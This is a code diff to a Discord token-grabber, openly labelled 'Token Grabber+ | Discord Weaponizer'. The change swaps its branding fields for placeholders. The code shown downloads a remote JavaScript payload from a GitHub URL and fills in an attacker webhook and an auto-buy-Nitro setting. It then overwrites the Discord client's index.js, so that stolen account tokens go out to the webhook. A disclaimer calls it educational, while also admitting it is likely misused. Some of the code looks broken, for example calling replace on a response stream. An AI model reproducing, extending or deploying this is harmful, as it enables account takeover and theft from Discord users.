@@ -8,11 +8,10 @@ const { BrowserWindow, session } = require("electron");
 const config = {
   auto_buy_nitro: changemeplease,
   ping_on_run: true,
-  ping_val: "@here", 
-  stringspy: "~~stringspy~~" // This code is made for educational purposes / pentesting. if you see this, that was probably not what it was used for. Send me this string at abuse@cynthialabs.net - Thanks
-  embed_name: "Token Grabber+ | Discord Weaponizer",
-  embed_icon:
-    "https://cdn.discordapp.com/avatars/928619303257923635/2101f61a8d6b468698893cb0d8677a15.webp",
+  ping_val: "@here",
+  stringspy: "~~stringspy~~", // This code is made for educational purposes / pentesting. if you see this, that was probably not what it was used for. Send me this string at abuse@cynthialabs.net - Thanks
+  embed_name: "~~branding~~",
+  embed_icon: "~~icon~~",
   embed_color: 8363488,
   webhook: "%WEBHOOK_LINK%",
   injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/NobodyWouldEverUseThis8/main/file.js",
@@ -113,7 +112,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}').replace('changemeplease', '${config.auto_buy_nitro}').replace("~~stringspy~~", '${config.stringspy}')
+        res.replace('%WEBHOOK%', '${config.webhook}').replace('changemeplease', '${config.auto_buy_nitro}').replace("~~stringspy~~", '${config.stringspy}').replace("~~branding~~", '${config.embed_name}').replace("~~icon~~", '${config.embed_icon}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
